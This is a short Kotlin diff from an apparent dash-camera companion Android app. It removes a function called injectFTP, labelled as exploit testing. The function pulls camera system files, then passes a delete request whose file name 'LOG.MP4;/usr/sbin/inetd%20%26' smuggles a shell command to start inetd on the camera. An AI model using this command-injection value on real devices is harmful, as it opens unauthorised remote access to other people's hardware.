@@ -582,17 +582,4 @@ class HttpClient(context: Context) {
         }
     }
 
-    /**
-     * @brief Placeholder for future maintenance/exploit testing functions.
-     */
-    suspend fun injectFTP(): Boolean {
-        updateFW()
-        downloadFile("http://$cameraIp/usr/bin/log/syslog_file",
-            "/storage/emulated/0/Android/data/com.lz1bgb.camhttp/files")
-        downloadFile("http://$cameraIp/usr/bin/ota_run",
-            "/storage/emulated/0/Android/data/com.lz1bgb.camhttp/files")
-
-        val token = sessionToken ?: return false
-        return deleteRemoteFile("/mnt/sd/Parking/Front", "LOG.MP4;/usr/sbin/inetd%20%26", token)
-    }
 }
